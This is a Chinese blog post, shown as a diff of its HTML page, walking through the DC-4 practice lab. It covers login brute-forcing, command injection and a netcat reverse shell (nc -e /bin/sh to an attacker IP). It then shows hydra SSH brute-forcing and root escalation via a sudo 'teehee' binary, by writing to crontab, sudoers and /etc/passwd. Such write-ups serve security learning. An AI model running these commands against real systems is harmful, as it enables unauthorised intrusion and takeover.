@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    DC-4 |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-ttamkh" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      DC-4
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/04/06/ttamkh/" class="article-date">
+  <time datetime="2020-04-06T01:09:57.000Z" itemprop="datePublished">2020-04-06</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>nmap 扫描端口</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586135479892-84d70930-f3f9-4299-bb8b-8664eba9675e.png#align=left&display=inline&height=296&margin=%5Bobject%20Object%5D&name=image.png&originHeight=592&originWidth=1022&size=136359&status=done&style=none&width=511" alt="image.png"></p>
+<p>浏览器访问一下，一个登陆界面，admin 作为用户名 password 爆破一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586136306352-150629a5-9e3c-4cdd-b4d3-87d0b97b42fc.png#align=left&display=inline&height=229&margin=%5Bobject%20Object%5D&name=image.png&originHeight=274&originWidth=523&size=13426&status=done&style=stroke&width=437" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586136234002-b7e91ef8-19c9-46af-aeaf-e225edca2787.png#align=left&display=inline&height=414&margin=%5Bobject%20Object%5D&name=image.png&originHeight=827&originWidth=842&size=74051&status=done&style=none&width=421" alt="image.png"></p>
+<p>登上以后</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586136425287-20b3d231-430f-46cd-9947-125789c1cd2d.png#align=left&display=inline&height=226&margin=%5Bobject%20Object%5D&name=image.png&originHeight=281&originWidth=299&size=9805&status=done&style=stroke&width=240" alt="image.png"></p>
+<p>命令执行！？</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586136521883-86d8bf17-c0a5-46e2-b2b3-a9aece1bbdd3.png#align=left&display=inline&height=262&margin=%5Bobject%20Object%5D&name=image.png&originHeight=524&originWidth=561&size=45894&status=done&style=stroke&width=281" alt="image.png"></p>
+<p>抓包改一下，发现可以执行其他命令</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586136571012-1b26f955-67ed-42f3-b902-720619eec07b.png#align=left&display=inline&height=496&margin=%5Bobject%20Object%5D&name=image.png&originHeight=992&originWidth=1264&size=127464&status=done&style=none&width=632" alt="image.png"></p>
+<p>nc 反弹个 shell（我第一时间想到的是 echo 写个 shell 进去，大佬的是 nc 直接用）<br>nc -e /bin/sh 192.168.149.141 6666</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586141173850-32984fdd-46f8-4738-bdbc-d1d5c733e158.png#align=left&display=inline&height=285&margin=%5Bobject%20Object%5D&name=image.png&originHeight=569&originWidth=903&size=106470&status=done&style=stroke&width=452" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586141150740-c4fad640-5fc2-41dd-8985-de33c6a5f342.png#align=left&display=inline&height=476&margin=%5Bobject%20Object%5D&name=image.png&originHeight=952&originWidth=1262&size=89041&status=done&style=stroke&width=631" alt="image.png"></p>
+<p>还是用 python 生成一个好点的交互</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586141316009-f3671e39-fbbe-4d83-8c53-8ffceb780ba0.png#align=left&display=inline&height=85&margin=%5Bobject%20Object%5D&name=image.png&originHeight=104&originWidth=590&size=21300&status=done&style=none&width=485" alt="image.png"></p>
+<p>在 jim 目录下面发现一个 backups 里面有 old-password</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586141592927-2539aeea-19f3-4860-8c64-67012881ba40.png#align=left&display=inline&height=441&margin=%5Bobject%20Object%5D&name=image.png&originHeight=616&originWidth=556&size=94278&status=done&style=none&width=398" alt="image.png"></p>
+<p>尝试爆破登录 ssh？哦吼，中奖</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586141850728-d78b42af-c620-477c-a480-3913d3e9eda4.png#align=left&display=inline&height=246&margin=%5Bobject%20Object%5D&name=image.png&originHeight=426&originWidth=1070&size=143679&status=done&style=none&width=618" alt="image.png"></p>
+<p>参数解释：<br>-l jim            指定爆破账号为 jim<br>-w 10            指定每个线程的回应时间为 10S<br>-P pwd.txt      指定密码字典为 pwd.txt<br>-t 10              指定爆破线程为 10 个<br>-v                  指定显示爆破过程<br>-f                  查找到第一个可以使用的账号和密码的时候停止破解</p>
+<p>ssh <a href="mailto:jim@192.168.149.160">jim@192.168.149.160</a><br>密码：jibril04</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586141902676-48e6575c-be41-4295-b8ad-3b6bd985d0f9.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=359&originWidth=823&size=98692&status=done&style=none&width=527" alt="image.png"></p>
+<p>在 /var/mail 目录下查看邮件信息</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586142548682-982f3c31-e3c6-4fe5-8b02-358dc60fcf06.png#align=left&display=inline&height=329&margin=%5Bobject%20Object%5D&name=image.png&originHeight=658&originWidth=1069&size=122462&status=done&style=none&width=534.5" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586143571153-15d5229d-9e09-4f5f-b51e-e5e349857f5a.png#align=left&display=inline&height=196&margin=%5Bobject%20Object%5D&name=image.png&originHeight=414&originWidth=1575&size=66586&status=done&style=stroke&width=746" alt="image.png"></p>
+<p>得到  charles 的密码：^xHhA&amp;hvim0y，su 切换一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586143778122-e5f4fd0a-bba8-44d3-9b8d-26ac864fbdf2.png#align=left&display=inline&height=92&margin=%5Bobject%20Object%5D&name=image.png&originHeight=131&originWidth=312&size=19451&status=done&style=none&width=219" alt="image.png"></p>
+<p>sudo -l 看一下，发现 teehee 不需要密码就可以 root 权限运行</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586143826933-a6ee310a-2a7e-4df5-9d18-96df40e0b495.png#align=left&display=inline&height=88&margin=%5Bobject%20Object%5D&name=image.png&originHeight=145&originWidth=1075&size=34464&status=done&style=none&width=653" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586150024585-c5d43a7e-d58d-4b5b-acf9-cd05f48371b9.png#align=left&display=inline&height=342&margin=%5Bobject%20Object%5D&name=image.png&originHeight=506&originWidth=752&size=103920&status=done&style=none&width=508" alt="image.png"></p>
+<p>用来将标准输入复制到文件，也复制到标准输出</p>
+<p>使用 teehee /etc/crontab  编辑一下<br>输入：* * * * * root chmod 4777 /bin/sh</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586144133559-69af246a-c480-45b4-802b-738dc1a10d49.png#align=left&display=inline&height=105&margin=%5Bobject%20Object%5D&name=image.png&originHeight=123&originWidth=539&size=26689&status=done&style=none&width=462" alt="image.png"></p>
+<p>再执行：ls -al  /bin/dash，然后 /bin/sh 就可以了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586144236204-b3ec9b76-dd00-4981-91e9-4c96e6c62875.png#align=left&display=inline&height=383&margin=%5Bobject%20Object%5D&name=image.png&originHeight=616&originWidth=914&size=79430&status=done&style=none&width=569" alt="image.png"></p>
+<p>另两种方法</p>
+<p>1、<br>echo “charles ALL=(ALL:ALL) ALL” | sudo teehee -a /etc/sudoers<br>sudo su root，然后输入 charles 的密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586151064690-39bd4f6a-22f1-485f-96e0-2ccf076b79aa.png#align=left&display=inline&height=224&margin=%5Bobject%20Object%5D&name=image.png&originHeight=322&originWidth=875&size=59659&status=done&style=none&width=610" alt="image.png"></p>
+<p>2、<br>如果能写在 passwd 里面一个 /bin/sh 的，跟 root 一样的话就可以</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586151180440-38ae20ed-71e5-463a-9ab8-f57f025d59a9.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&name=image.png&originHeight=209&originWidth=482&size=42558&status=done&style=none&width=422" alt="image.png"></p>
+<p>echo “yichen::0:0:::/bin/sh” | sudo teehee -a /etc/passwd<br>su yichen</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1586151580347-5205d554-9b34-4f13-83f5-e85b7b6a312f.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=108&originWidth=816&size=22111&status=done&style=none&width=611" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/04/06/ttamkh/" data-id="ckco53qbk000j8ou9hyb86fa8" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/04/13/mvdmkl/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            DC-5
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/03/31/orht29/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">DC-3</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
